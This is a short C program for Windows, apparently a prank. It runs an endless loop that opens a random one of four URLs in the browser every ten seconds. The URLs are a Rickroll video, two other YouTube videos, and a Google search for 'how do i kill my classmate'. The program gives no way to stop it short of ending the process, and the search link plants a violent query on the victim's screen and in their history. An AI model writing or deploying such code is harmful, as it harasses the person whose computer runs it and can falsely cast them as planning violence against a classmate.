#include <windows.h>

int main(){
    LPCSTR web[4] = {
        "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
        "https://www.youtube.com/watch?v=saNzVNhMSn0",
        "https://www.youtube.com/watch?v=BbeeuzU5Qc8",
        "https://www.google.com/search?q=how+do+i++kill+my+classmate&client=firefox-b-d&sca_esv=590844747&sxsrf=AM9HkKnRNhec1CreaHOArOnT8akBl21GVg%3A1702548760915&ei=GNV6ZZ69N-rm2roP74WNqAw&ved=0ahUKEwieqe2w2I6DAxVqs1YBHe9CA8UQ4dUDCBA&uact=5&oq=how+do+i++kill+my+classmate&gs_lp=Egxnd3Mtd2l6LXNlcnAiG2hvdyBkbyBpICBraWxsIG15IGNsYXNzbWF0ZUicIFCKBlj4GXACeACQAQCYAWKgAZUDqgEBNrgBA8gBAPgBAeIDBBgBIEGIBgE&sclient=gws-wiz-serp"
    };
    while(1){
        ShellExecuteA(NULL, "open", web[rand()%4], NULL, NULL, SW_SHOWNORMAL);
        Sleep(10000);
    }

}